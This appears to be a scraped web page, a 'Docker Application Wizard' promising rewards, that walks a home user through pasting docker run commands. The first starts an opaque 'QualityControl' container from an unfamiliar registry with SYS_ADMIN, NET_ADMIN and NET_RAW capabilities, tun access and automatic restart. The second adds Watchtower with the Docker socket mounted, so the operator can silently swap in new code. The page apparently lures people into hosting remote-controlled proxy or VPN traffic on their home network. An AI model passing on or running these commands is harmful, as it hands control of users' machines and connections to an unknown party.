https://org-639fb.web.app/ setupvpn Docker












# 1

Docker Application Wizard

Please confirm you fulfill following requirements
Operating system: Windows or MacOS or Linux
Software required: Docker or Docker Desktop
Language: Basic Level of English
Location: I will host it at my home computer
I will send you an email once started
I will need to start 2 containers

Continue

# 2
Docker Application - Step 2
Please make sure to enter a valid email address otherwise we cannot assign your rewards

hyh1175561641@gmail.com Continue
Windows



# 3






Step 1/2 : Start QualityControl
It is essential that you start the container with given flags and configuration options. Especially your login must be correct with your email address you have contacted us

Copy & Paste the following command to start QualityControl
```dockerfile
docker run -d --name qualitycontrol -e LOGIN="hyh1175561641@gmail.com" --device=/dev/net/tun --cap-add=NET_ADMIN --cap-add=NET_RAW --cap-add=SYS_ADMIN --log-opt max-size=10m --log-opt max-file=3 --restart=always ghcr.io/org004/qc:latest
```
After you have started QualityControl, you should not have any error on the console. You can verify it running with

docker exec qualitycontrol status

command on the console.


QualityControl is running





# 4


Step 2/2 : Start Watchtower
WatchTower is a tool to update containers automatically. This is essential because our container needs updates regularly in order to adapt to new conditions in a given location. You can find WatchTower documentation at https://containrrr.dev/watchtower/ or at github

Copy & Paste the following command to start Watchtower

      
        docker run -d --name watchtower --restart=always -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/containrrr/watchtower:latest --interval 3600
      
    

After you have started Watchtower, you should not have any error on the console. You can verify it running with

docker ps watchtower

command on the console.

WatchTower is running



# 5




Please Send Us Email
Please send an email to docker@vomc.com that you have started both containers. Make sure to send this email from hyh1175561641@gmail.com
We will respect your privacy. Please email us so we can activate your premium account(s)
Once you have launched both containers, our system will send you an email as confirmation. If you do not receive an email within several hours of running, please contact us, so we can take a look.

Watch this short video to get started

Send Email
